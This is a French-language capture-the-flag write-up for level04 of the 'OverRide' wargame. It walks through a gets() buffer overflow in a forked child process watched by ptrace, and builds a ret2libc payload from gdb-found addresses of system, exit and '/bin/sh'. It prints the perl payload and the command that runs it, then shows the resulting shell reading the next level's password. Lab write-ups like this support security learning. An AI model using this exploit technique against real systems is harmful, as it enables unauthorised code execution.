# level04

Ce programme fait un fork. Le main (`if ( v9) ...`) surveille le contenu de l'offset 44 dans le child via la fonction `ptrace` avec le mode `PTRACE_PEEKUSER`. Cette valeur est mise dans la variable v8, puis verifiée dans une boucle infinie.

Le child fait un `gets`, ce qui pourrait nous permettre de faire un buffer overflow, tant qu'on garde la valeur de l'offset 44 à 11.

On fait segfault le child à l'offset 156.

On essaye la méthode `RET2LIBC` pour executer notre payload.

On commence par chercher l'adresse de la fonction `system` :
```bash
(gdb) info function system
All functions matching regular expression "system" :
...
0xf7e6aed0  system
```
L'adresse de la fonction `exit`:
```bash
(gdb) info function exit
All functions matching regular expression "exit" :
...
0xf7e5eb70  exit
```
Et l'adresse d'une occurence de notre commande à executer :
```bash
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```
On construit notre payload :
```bash
level04@OverRide:~$ perl -e 'print "A"x156 ."\xd0\xae\xe6\xf7"."\x70\xeb\xe5\xf7"."\xec\x97\xf8\xf7";' > /tmp/payload
```
Et on arrive à lancer un terminal :
```bash
level04@OverRide:~$ cat /tmp/payload - | ./level04 
Give me some shellcode, k

cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
